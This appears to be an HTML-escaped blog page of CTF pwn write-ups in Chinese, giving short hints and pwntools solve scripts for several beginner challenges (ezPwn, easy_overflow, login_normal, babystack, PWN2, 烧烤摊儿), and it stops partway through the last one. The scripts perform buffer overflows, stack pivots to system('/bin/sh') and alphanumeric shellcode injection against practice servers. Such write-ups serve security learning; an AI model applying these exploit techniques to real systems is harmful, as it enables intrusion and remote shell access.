&lt;h5 id=&#34;nustctf-2022-新生赛ezpwn&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#nustctf-2022-新生赛ezpwn&#34;&gt;#&lt;/a&gt; [NUSTCTF 2022 新生赛] ezPwn&lt;/h5&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;什么判断直接不管gets溢出后直接跳转到system地址即可&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p=remote()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;elf=ELF(&amp;#x27;./pwn&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload=cyclic(0x12)+p64(elf.sym[&amp;#x27;system&amp;#x27;])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.send(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h5 id=&#34;hgame-2023-week1easy_overflow&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#hgame-2023-week1easy_overflow&#34;&gt;#&lt;/a&gt; [HGAME 2023 week1]easy_overflow&lt;/h5&gt;
&lt;p&gt;很简单的一个 ret2text 但是有个坑点就是 close (1) 这个点你需要连上去后使用 exec 1&amp;gt;&amp;amp;0 来打开标准输出&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context(log_level=&amp;#x27;debug&amp;#x27;,os=&amp;#x27;linux&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p=remote(&amp;#x27;node5.anna.nssctf.cn&amp;#x27;,28539)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload=b&amp;#x27;a&amp;#x27;*0x18+p64(0x40101a)+p64(0x401176)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.send(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h5 id=&#34;ciscn-2022-初赛login_normal&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ciscn-2022-初赛login_normal&#34;&gt;#&lt;/a&gt; [CISCN 2022 初赛] login_normal&lt;/h5&gt;
&lt;p&gt;这个题考点在于代码审计&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.log_level=&amp;#x27;debug&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.arch=&amp;#x27;amd64&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io=remote(&amp;quot;node4.anna.nssctf.cn&amp;quot;,28823)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#io=process(&amp;#x27;./login&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.recvuntil(&amp;quot;=================&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#gdb.attach(io)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = b&amp;#x27;opt:1\nmsg:ro0tt\n&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#gdb.attach(io)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.sendline(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#shellcode = shellcraft.sh()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;shellcode=b&amp;quot;RRYh00AAX1A0hA004X1A4hA00AX1A8QX44Pj0X40PZPjAX4znoNDnRYZnCXAA&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = b&amp;#x27;opt:2\nmsg:&amp;#x27;+shellcode+b&amp;#x27;\n&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.recvuntil(&amp;quot;&amp;gt;&amp;gt;&amp;gt; &amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#gdb.attach(io)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.sendline(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h5 id=&#34;swpuctf-2022-新生赛darling&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#swpuctf-2022-新生赛darling&#34;&gt;#&lt;/a&gt; [SWPUCTF 2022 新生赛] Darling&lt;/h5&gt;
&lt;p&gt;随机数 srand&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import ctypes&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc=ctypes.CDLL(&amp;#x27;/lib/x86_64-linux-gnu/libc.so.6&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc.srand(0x1317E53)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sl=libc.rand()%100-64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendline(str(sl))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h5 id=&#34;uuctf-2022-新生赛babystack&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#uuctf-2022-新生赛babystack&#34;&gt;#&lt;/a&gt; [UUCTF 2022 新生赛] babystack&lt;/h5&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context(log_level=&amp;#x27;debug&amp;#x27;,os=&amp;#x27;linux&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p=remote(&amp;#x27;node5.anna.nssctf.cn&amp;#x27;,28003)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload=b&amp;#x27;a&amp;#x27;*0x108+p64(0x0400591)+p64(0x400726)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendlineafter(&amp;#x27;name?&amp;#x27;,payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h5 id=&#34;ciscn-2019东南pwn2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ciscn-2019东南pwn2&#34;&gt;#&lt;/a&gt; [CISCN 2019 东南] PWN2&lt;/h5&gt;
&lt;p&gt;这个题很不错适合新手吃 32 位的栈偏移&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context(arch=&amp;#x27;i386&amp;#x27;,log_level=&amp;#x27;debug&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;leave_ret=0x080485FD  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;offset=0xffffcd58-0xffffcd20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io=process(&amp;#x27;./pwn&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io=remote(&amp;#x27;node5.anna.nssctf.cn&amp;#x27;,28203)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;elf=ELF(&amp;#x27;./pwn&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# 第一次溢出1字节覆盖\x00，泄露ebp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.sendafter(b&amp;#x27;name?\n&amp;#x27;,b&amp;#x27;a&amp;#x27;*(0x28-1)+b&amp;#x27;b&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.recvuntil(b&amp;#x27;aaab&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;leak_ebp=u32(io.recvuntil(b&amp;#x27;\xff&amp;#x27;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;success(hex(leak_ebp)) &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;target_addr=leak_ebp-offset-0x4 # -0x4是因为第二次leave;ret的时候，pop esp会导致+0x4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; # 第二次溢出，rop写在s中，栈迁移到s，调用system，参数为自己写在栈上的/bin/sh，参数偏移计算可&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload=p32(elf.plt[&amp;#x27;system&amp;#x27;])+p32(elf.sym[&amp;#x27;_start&amp;#x27;])+p32(leak_ebp-offset+0xc)+b&amp;#x27;/bin/sh\x00&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload=payload.ljust(0x28,b&amp;#x27;a&amp;#x27;)+p32(target_addr)+p32(leave_ret)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.send(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h5 id=&#34;ciscn-2023-初赛烧烤摊儿&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ciscn-2023-初赛烧烤摊儿&#34;&gt;#&lt;/a&gt; [CISCN 2023 初赛] 烧烤摊儿&lt;/h5&gt;
&lt;p&gt;这是一个 64 位的 ret2syscall 注意 execve 调用位 64 是 59，或者可以直接使用 ropgadget 的 ropchain 来直接生成 payload 首先审计源码利用负数达到金额然后在利用改名里面的溢出达到 shell，注意这个是静态&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;90&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;91&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;92&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;93&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;94&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;95&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;96&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;97&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;98&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;99&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;100&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;101&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;102&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;103&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;104&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;105&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;106&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;107&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;108&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;109&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;110&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;111&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;112&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;113&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;114&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;115&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;116&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;117&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;118&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;119&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;120&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;121&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;122&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;123&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;124&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;125&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;126&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;127&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;128&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;129&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;130&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;131&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;132&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;133&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;134&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;135&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;136&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;137&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;138&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;139&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;140&lt;/span&gt;&lt;br&gt;&lt;span 